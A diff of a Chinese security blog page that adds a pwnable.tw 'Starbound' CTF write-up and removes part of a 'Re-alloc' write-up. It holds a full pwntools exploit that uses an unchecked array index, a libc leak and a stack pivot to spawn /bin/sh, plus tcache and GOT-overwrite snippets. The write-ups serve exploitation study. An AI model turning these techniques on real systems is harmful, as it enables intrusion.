@@ -166,6 +166,143 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/224d2c00b9a1.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ava1.jpg">
+      <meta itemprop="name" content="Cameudis">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cameudis' Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/Tech/Pwn/224d2c00b9a1.html" class="post-title-link" itemprop="url">【Pwn#0x13】pwnable.tw Starbound writeup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-10-13 14:59:14" itemprop="dateCreated datePublished" datetime="2023-10-13T14:59:14+08:00">2023-10-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/Tech/Pwn/224d2c00b9a1.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x13】pwnable.tw Starbound writeup" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/Tech/Pwn/224d2c00b9a1.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/224d2c00b9a1.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>本题 neta 了星界边境，实现了一个简单的二维探索游戏。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/mnt/c/Projects/ctf_archive/[pwnable.tw]Starbound/pwn&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8047000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>数组下标未检查导致的任意控制流劫持。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">256</span>]; <span class="comment">// [esp+10h] [ebp-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    alarm(<span class="number">0x3C</span>u);</span><br><span class="line">    menu_func_ptr();</span><br><span class="line">    <span class="keyword">if</span> ( !readn(nptr, <span class="number">256u</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = strtol(nptr, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))func_ptrs[v3])();          <span class="comment">// 数组index溢出！</span></span><br><span class="line">  &#125;</span><br><span class="line">  do_bye();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 main 函数中，有一个对于函数指针数组的调用，index 数据来自于用户输入经 strtol 转化成的数字。我们可以用 <code>cmd_set_name</code> 函数修改 data 段的数据，再让程序 call 我们控制的地址，达成 arbitary call。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h3 id="ROP-方法"><a href="#ROP-方法" class="headerlink" title="ROP 方法"></a>ROP 方法</h3><p>有了任意调用，程序又没有开 PIE，接下来就是看看程序本体有哪些东西可以给我们来调用。<br>我在本体中，并没有找到 win 相关的函数，也没有找到导入的 system 符号，因此似乎没有简单的 ret2text 方法来完成一击必杀。</p>
+<p>那就来打个 ROP 吧，我们可以直接用 main 函数 buffer 来存放 ROP 链，只要找一个类似于 <code>add esp, xxx; ret;</code> 的 gadget 即可。</p>
+<p>使用这种方法，我们可以先用 <code>puts</code> 泄露 libc 基址，然后就能 <code>system(&quot;/bin/sh&quot;)</code> 了。具体利用见完整 EXP。<br>查 libc 版本用的是 <a target="_blank" rel="noopener" href="https://libc.rip/">libc-database</a>，俄罗斯那个（<a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc.blukat.me</a>）查到的结果贼少，不知道为什么。</p>
+<h3 id="路径穿越方法（存在利用条件限制）"><a href="#路径穿越方法（存在利用条件限制）" class="headerlink" title="路径穿越方法（存在利用条件限制）"></a>路径穿越方法（存在利用条件限制）</h3><p>ROP 方法是我不小心从网上看到的，唉我不应该上网查的。<br>不过我自己也想出了一个非常绝妙的利用，不需要用到 ROP！</p>
+<p>我们已有的任意调用，其参数是固定好的，第一个参数是一个我们可控的字符串指针，第二个参数是 0。顺着这个思路，我们可以先看看程序本体中有哪些函数，其第一个参数是 <code>char*</code> 类型的。</p>
+<p>首先，此类函数肯定是 printf 最常见也最好利用，我们可以用这种方法将任意调用宽展成任意读写，但程序开启了 FORTIFY 保护，里面甚至只有 <code>_printf_chk</code> 函数没有 <code>printf</code> 函数。两者的区别在于，后者其实是前者的一个 wrapper。<br>前者的第一个参数是一个安全等级，1 表示开启，0 表示关闭。当开启时，格式化字符串攻击将会被大大削弱，比如不能直接使用 <code>%n$d</code> 了，如果要用到这玩意，必须前面要有 <code>%1$d</code> <code>%2$d</code> … <code>%(n-1)$d</code> 这些。<br>因此，这条路走不通。</p>
+<p>但我们就可以找到另外两个首个参数的—— <code>mkdir</code> 和 <code>open</code>。既然有 open，就可以想想是不是能 orw 把 flag 读出来。但是，程序的漏洞处，相邻的两次触发之间隔了许多个函数调用，这就不允许我们把 open 返回值暂时放在寄存器中，这里就很难进行下一步操作。</p>
+<p>但是，我把整个 binary 都审了一边，发现了一个有趣的机制：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cmd_multiplayer_enable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v0; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">socklen_t</span> len; <span class="comment">// [esp+2Ch] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [esp+32h] [ebp-7Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( fd != <span class="number">-1</span> )</span><br><span class="line">    close(fd);</span><br><span class="line">  addr.sa_family = <span class="number">1</span>;</span><br><span class="line">  fd = socket(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>);                         <span class="comment">// UDP</span></span><br><span class="line">  <span class="keyword">if</span> ( fd &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[Error] Fail to enable&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>cmd_multiplayer_enable</code> 中，有对于一个全局变量 <code>fd</code> 的赋值。而我们知道，进程打开的第一个文件往往是接在 <code>stderr</code> 的后面，也就是 fd &#x3D;&#x3D; 3。<br>我们可以观察到，程序在使用 close 关闭 fd 之后，并没有清空 fd 的值，也就是这里依然是 3。实际调用这个函数，发现程序肯定可以走到关闭 fd 的代码。</p>
+<p>我们查找 fd 的应用，可以找到这里：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cmd_multiplayer_recvmap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  v5 = getpid();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ask your friends to share their coordinates!&quot;</span>);</span><br><span class="line">  v0 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(fd, buf, <span class="number">1u</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[Error] Transmission error :(&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf[<span class="number">0</span>] == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    buf[<span class="number">0</span>] = rotate_shift_add_decrypt(buf[<span class="number">0</span>], &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1</span>, <span class="string">&quot;[Info] Receiving (&quot;</span>);</span><br><span class="line">      v0 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(buf[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里程序将会尝试从 fd 中读取内容，每一个字节都使用 <code>rotate_shift_add_decrypt</code> 函数进行加密，然后打印出结果。</p>
+<p>于是我们可以想到一条利用链：</p>
+<ol>
+<li>调用 <code>cmd_multiplayer_enable</code>，让 fd 被置为 3；</li>
+<li>调用 <code>open</code> 函数打开 flag；</li>
+<li>调用 <code>rotate_shift_add_decrypt</code>，读取加密后的 flag 并输出；</li>
+<li>本地尝试暴力破解！</li>
+</ol>
+<p>但我们会遇到一个问题：虽然我们可以控制第一个参数这个字符串，但是其开头被限制了是一个数字，因为我们就是用这个数字当作数组下标来实现任意调用的。<br>为此，我想到了一种借用 <code>mkdir</code> 来加强 <code>open</code> 的方法：</p>
+<ol>
+<li>调用 <code>mkdir(&quot;-33\0&quot;)</code> 在当前目录创建名为 -33 的文件夹；</li>
+<li>调用 <code>open(&quot;-33/../flag\0&quot;)</code> 打开任意目录下的 flag。</li>
+</ol>
+<p>在本地，这种方法是可行的。然而，远程环境中执行 binary 的路径是根目录，而进程并没有在根目录创建文件夹的权限，因此这种方法很遗憾地失效了 : (</p>
+<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">io = process([filename])</span><br><span class="line">io = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10202</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    g = gdb.attach(io, <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        b *0x0804A65D</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># 0x08048e48 : add esp, 0x1c ; ret</span></span><br><span class="line">    add_esp_1c_ret = <span class="number">0x08048e48</span></span><br><span class="line"></span><br><span class="line">    payload = flat([</span><br><span class="line">        elf.symbols[<span class="string">&#x27;puts&#x27;</span>], elf.symbols[<span class="string">&#x27;_start&#x27;</span>], elf.got[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;6&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;name&quot;</span>, pack(add_esp_1c_ret))</span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;-33\0dead&quot;</span>+payload)</span><br><span class="line"></span><br><span class="line">    mes = io.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">    libc_base = unpack(mes,<span class="number">32</span>) - <span class="number">0x5fca0</span></span><br><span class="line">    log.info(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system_addr = libc_base + <span class="number">0x3ada0</span></span><br><span class="line">    <span class="comment"># system_addr = libc_base + 0x49670 # printf</span></span><br><span class="line"></span><br><span class="line">    payload = flat([</span><br><span class="line">        system_addr, elf.symbols[<span class="string">&#x27;_start&#x27;</span>], <span class="number">0x080580D0</span>+<span class="number">0x4</span>,</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;6&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;name&quot;</span>, pack(add_esp_1c_ret)+<span class="string">b&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;-33\0dead&quot;</span>+payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="反思和总结"><a href="#反思和总结" class="headerlink" title="反思和总结"></a>反思和总结</h2><p><strong>函数数组和数组下标都是非常危险的东西——前者容易被劫持，后者容易超越边界。</strong><br>本漏洞修补十分简单，只需要加上一个检查就可以了。</p>
+<p>从这道题目的利用中，我们可以发现：<strong>任意调用与 gadget 结合或许可以轻松达成栈迁移，允许我们进行 ROP 攻击。</strong></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Daily/ff41d015749c.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1472,150 +1609,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/f6c454d44380.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/ava1.jpg">
-      <meta itemprop="name" content="Cameudis">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Cameudis' Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/Tech/Pwn/f6c454d44380.html" class="post-title-link" itemprop="url">【Pwn#0x10】pwnable.tw Re-alloc writeup</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-04-13 23:03:41" itemprop="dateCreated datePublished" datetime="2023-04-13T23:03:41+08:00">2023-04-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/Tech/Pwn/f6c454d44380.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x10】pwnable.tw Re-alloc writeup" title="Views">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">Views: </span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine: </span>
-    
-    <a title="valine" href="/Tech/Pwn/f6c454d44380.html#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/f6c454d44380.html" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>相关：realloc、tcache2.29</p>
-<p>借用了很多巧合，实在是特别“幸运”的一个利用。<br>自己做出来之后，发现网上大部分wp都和我的解法不一样，但是更通用一些，不像我的那么极限（草）。</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>保护情况：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
-
-<p>程序是一个菜单，提供了alloc、realloc、free功能，来操作bss段的两个栏位，大致功能如下：</p>
-<ul>
-<li>alloc：选中栏当前为NULL时，使用 realloc(NULL, size) 分配新的区块并读入数据；</li>
-<li>realloc：选中栏当前非NULL时，将选中栏使用 realloc(ptr, size) 来调整大小并（如果realloc返回值非0）读入数据；</li>
-<li>free：将选中栏使用 realloc(ptr, 0) 进行释放，并<strong>将指针置零</strong>。</li>
-</ul>
-<p>主要的漏洞在于realloc的使用上，可以通过RTFM（在线man地址：<a target="_blank" rel="noopener" href="https://linux.die.net/man/3/realloc">realloc(3): allocate&#x2F;free dynamic memory - Linux man page</a>）得到realloc的说明：</p>
-<blockquote>
-<p>The <strong>realloc</strong>() function changes the size of the memory block pointed to by <em>ptr</em> to <em>size</em> bytes. The contents will be unchanged in the range from the start of the region up to the minimum of the old and new sizes. If the new size is larger than the old size, the added memory will <em>not</em> be initialized. If <em>ptr</em> is NULL, then the call is equivalent to <em>malloc(size)</em>, for all values of <em>size</em>; if <em>size</em> is equal to zero, and <em>ptr</em> is not NULL, then the call is equivalent to <em>free(ptr)</em>. Unless <em>ptr</em> is NULL, it must have been returned by an earlier call to <strong>malloc</strong>(), <strong>calloc</strong>() or <strong>realloc</strong>(). If the area pointed to was moved, a <em>free(ptr)</em> is done.</p>
-</blockquote>
-<p>注意到，当ptr字段为0，realloc等价于malloc；当ptr不为0但size为0时，realloc等价于free。</p>
-<p>程序确实使用这两种功能来实现了malloc以及free，但是在realloc和free功能中，检查做得不够完善：</p>
-<ul>
-<li>当realloc中输入size为0，可以<strong>触发free，且不将原指针置零</strong>，创造了UAF的可能。</li>
-<li>使用free作用于空栏位（NULL），可以触发一次匿名的malloc(0)。这里的匿名指的是结果不会保存在bss段结构中，因为free会将其置零。</li>
-</ul>
-<p>其实另外还在alloc功能中发现了一个Off-by-NULL漏洞，但我并没有想到很好的办法来用到这个漏洞。</p>
-<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>在宏观的层面上，由于程序二进制本身虽然关闭了PIE，但没有特别有用的函数，因此思路还是两步走：泄露libc地址、劫持控制流。</p>
-<h3 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h3><p>程序本身并没有能够提供打印区块数据的功能，因此想要泄露libc数据就一定需要劫持控制流。<br>目前，栈地址未知排除ROP，将目标瞄准GOT：</p>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">off_404018 dq offset _exit  </span><br><span class="line">off_404020 dq offset __read_chk</span><br><span class="line">off_404028 dq offset puts</span><br><span class="line">off_404030 dq offset __stack_chk_fail</span><br><span class="line">off_404038 dq offset printf</span><br><span class="line">off_404040 dq offset alarm</span><br><span class="line">off_404048 dq offset atoll</span><br><span class="line">off_404050 dq offset signal</span><br><span class="line">off_404058 dq offset realloc</span><br><span class="line">off_404060 dq offset setvbuf</span><br><span class="line">off_404068 dq offset __isoc99_scanf</span><br></pre></td></tr></table></figure>
-
-<p>首先思考可不可以把唯一操作区块的外部函数——realloc替换为puts来泄露地址，笔者这时顾忌到题目限制了区块大小，不太方便构造 unsorted bin 中的区块。<br>因此将目标瞄准了atoll，这个函数在read_long中被调用，参数是栈上用来读入数字的buffer。可以尝试用它来泄露栈上的数据。</p>
-<p>这时一个好主意是使用plt[printf]代替atoll，这样就可以在栈上指哪打哪，可惜笔者做的时候并没有想到这个好主意，只是用了plt[puts]。不过不影响，因为我遇到了第一个逆天的巧合：<strong>在buffer+8的位置就有一个libc地址</strong>。先介绍一下怎么覆写的：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">b&quot;victim&quot;</span>)</span><br><span class="line">realloc_free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x18</span>, pack(elf.got[<span class="string">&quot;atoll&quot;</span>]))</span><br><span class="line">free(<span class="number">1</span>)     <span class="comment"># alloc a anonymous 0x20 chunk</span></span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x18</span>, pack(elf.plt[<span class="string">&quot;puts&quot;</span>])+pack(<span class="number">0</span>)+pack(<span class="number">0x4015DC</span>))</span><br></pre></td></tr></table></figure>
-
-<p>第一行创建了一个0x20大小区块，第二行将其释放进入tcache，同时保留了这个指针。<br>第三行使用了realloc，realloc发现这个区块大小正常就直接放行了，从而我们可以覆盖fd指针为got[atoll]。<br>第四行使用free的漏洞来申请一个匿名区块，分配完之后再下一个区块就是atoll了。<br>第五行将atoll覆盖为plt[puts]，并顺便把realloc覆盖为一个普通 <code>ret</code> 的地址，原因后面再说。</p>
-<p><em>这里需要提一嘴，我使用了匿名区块来解决这一问题：非0的栏位无法进行alloc。不过在复盘时，从网上的大佬那边发现可以通过一种非常巧妙的方式来将栏位置零，同时又不干扰已经位于tcache中的atoll地址，从而将后续利用流程也变得直观一些。<br>可以通过realloc将区块变大，然后再free。这样就可以free到别的大小的tcache中，并且根本不用关注key的检查，也不会将atoll的地址覆盖，一举两得。<br>参考地址见<a target="_blank" rel="noopener" href="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/">Binary Exploitation [pwnable.tw] - Realloc - Tainted Bits</a></em></p>
-<p>接下来泄露libc地址，由于buffer+8就有，因此简简单单就可以泄露了：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1111111\n&quot;</span>)   <span class="comment"># just padding</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;1111111\n&quot;</span>)</span><br><span class="line">libc_base = unpack(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x1e570a</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
-
